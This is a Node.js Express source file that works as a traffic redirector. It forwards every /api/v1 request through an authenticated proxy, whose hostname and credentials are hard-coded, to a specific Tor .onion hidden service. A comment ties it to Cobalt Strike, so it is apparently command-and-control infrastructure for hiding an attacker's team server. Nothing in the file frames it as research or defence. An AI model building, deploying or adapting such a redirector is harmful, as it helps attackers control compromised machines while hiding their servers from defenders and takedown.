const express = require('express');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Tor HTTPS proxy configuration
const proxyOptions = {
  host: 'ep01.goodextensions.mooo.com',
  port: 443,
  auth: 'mixtura:mixtura',
  secureProxy: true,
};

// Create proxy agent
const proxyAgent = new HttpsProxyAgent(proxyOptions);

// Target Tor hidden service
const onionUrl = 'http://ttcbgkpnl6at7dqhroa2shu44zqxzpwwwvdxbzoqznxk7lg5xso6bbqd.onion/api/v1';

// Middleware to parse JSON bodies (if needed by Cobalt Strike)
app.use(express.json());

// Route to handle /api/v1 requests
app.all('/api/v1/*', async (req, res) => {
  try {
    // Construct the full URL for the hidden service
    const targetPath = req.originalUrl.replace('/api/v1', '');
    const targetUrl = `${onionUrl}${targetPath}`;

    // Forward the request to the Tor hidden service
    const response = await axios({
      method: req.method,
      url: targetUrl,
      headers: {
        ...req.headers,
        host: new URL(onionUrl).host, // Set correct host for .onion
        'X-Forwarded-For': undefined, // Remove X-Forwarded-For for anonymity
      },
      data: req.body,
      proxy: false, // Disable axios default proxy
      httpAgent: proxyAgent, // Use Tor proxy agent
      httpsAgent: proxyAgent,
      timeout: 30000, // 30-second timeout
    });

    // Forward response headers and status
    res.status(response.status);
    Object.entries(response.headers).forEach(([key, value]) => {
      res.setHeader(key, value);
    });

    // Send response data
    res.send(response.data);
  } catch (error) {
    console.error('Proxy Error:', error.message);
    res.status(500).json({
      error: 'Internal Server Error',
      message: error.message,
    });
  }
});

// Health check endpoint for hosting platform
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK' });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
